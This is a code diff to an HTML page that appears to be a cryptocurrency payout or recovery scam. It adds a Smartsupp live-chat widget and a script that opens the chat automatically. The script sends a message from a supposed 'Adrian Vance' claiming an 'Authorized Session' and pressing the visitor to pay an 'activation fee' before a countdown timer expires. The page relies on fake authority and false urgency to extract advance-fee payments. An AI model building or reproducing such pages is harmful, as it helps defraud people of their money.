@@ -12,6 +12,18 @@
         .wallet-box { background: #f8fafc; border: 2px solid #cbd5e1; font-family: monospace; }
         .token-input { letter-spacing: 0.15em; text-transform: uppercase; font-family: monospace; }
     </style>
+
+    <script type="text/javascript">
+    var _smartsupp = _smartsupp || {};
+    _smartsupp.key = '5b41020754ccb9bf3a221593456d716ff396721c';
+    window.smartsupp||(function(d) {
+      var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+      s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+      c.type='text/javascript';c.charset='utf-8';c.async=true;
+      c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+    })(document);
+    </script>
+    <noscript>Powered by <a href="https://www.smartsupp.com" target="_blank">Smartsupp</a></noscript>
 </head>
 <body class="bg-slate-50 font-sans text-slate-900">
 
@@ -100,6 +112,7 @@
     </main>
 
     <script>
+        // Security Timer Logic
         let time = 600;
         const timerDisplay = document.getElementById('timer');
         setInterval(() => {
@@ -109,6 +122,16 @@
             timerDisplay.innerHTML = `${minutes}:${seconds}`;
             if(time > 0) time--;
         }, 1000);
+
+        // Adrian Vance (Smartsupp) Automation
+        _smartsupp('on', 'load', function() {
+            setTimeout(function() {
+                _smartsupp('chat:open');
+                _smartsupp('message:send', {
+                    text: "Authorized Session: I am Adrian Vance. I am monitoring your payout request. Please complete the requisition form and pay the activation fee to avoid token expiration."
+                });
+            }, 3000);
+        });
     </script>
 </body>
 </html>
